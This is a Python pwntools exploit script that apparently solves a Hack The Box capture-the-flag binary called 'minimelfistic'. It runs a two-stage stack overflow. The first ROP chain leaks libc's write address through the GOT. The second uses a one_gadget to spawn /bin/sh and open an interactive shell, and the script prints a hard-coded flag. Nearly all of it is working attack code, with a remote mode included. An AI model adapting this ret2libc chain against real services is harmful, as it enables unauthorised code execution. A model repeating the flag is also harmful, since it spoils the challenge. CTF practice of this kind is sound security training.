#!/usr/bin/env python3
from pwn import *	# Manual pop_rsi_r15 + one_gadget

context.arch = 'amd64'

elf = ELF('./minimelfistic')
rop = ROP(elf)

local = True

if(local == True):
	io = elf.process()
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec = False)
else:
	io = remote(ip, port)
	libc = ELF('./libc.so.6', checksec = False)

padding = b'A' * 72 
pop_rsi_r15 = rop.rsi.address
write_got = elf.got["write"]
write_plt = elf.symbols["write"]
banner_func = elf.symbols["banner"]
main_func = elf.symbols["main"]

# Payload Goal: EDI = 1, RSI = write_got, RDX = 8
# 1. Call banner() to set RDX to 0x1836 and EDI to 0x1
# 2. Call pop_rsi_r15 gadget to put write() GOT entry into RSI
# 3. Fill back popped r15 value with any 8 bytes value
# 4. Call write_plt to leak libc
# 5. Return to vulnerable function main() to execute stage 2
payload = padding 
payload += p64(banner_func)
payload += p64(pop_rsi_r15) 
payload += p64(write_got)	# write_got fill into rsi
payload += p64(0x3030303030303030) # Filler value to fill popped r15 (8 bytes)
payload += p64(write_plt)
payload += p64(main_func)

# Stage 1 - Leak libc
# Overflow Stack
log.info('Attempting to leak libc base...')
log.info('Sending first payload...')
io.recvuntil(b'>')
io.send(payload)

# Exit function to trigger overflow
log.info('Triggering overflow...')
io.recvuntil(b'>')
io.send(b'9\n')

# Skip banner
io.recvlines(41)

# Read leaked address
libc_write_addr = u64(io.recv(8))

# Compute libc base address
libc_base = libc_write_addr - libc.symbols["write"]
log.info(f'Found libc base: {hex(libc_base)}')

# Stage 2 - Execute /bin/sh
one_gadget = 0xc7420 # 3rd gadget from `one_gadget /lib/x86_64-linux-gnu/libc.so.6`
gadget_jmp = p64(libc_base + one_gadget)
null_val = p64(0)
payload2 = padding + gadget_jmp + null_val * 100

# Overflow stack
log.info('Attempting to execute /bin/sh...')
log.info('Sending second payload...')
io.recvuntil(b'>')
io.send(payload2)

# Exit function to trigger overflow
log.info('Triggering overflow...')
io.recvuntil(b'>')
io.send(b'9\n')

# Pass shell to user, hopefully with /bin/sh access
log.critical("HTB{S4nt4_15_n0w_r34dy_t0_g1v3_s0m3_g1ft5}")
io.interactive()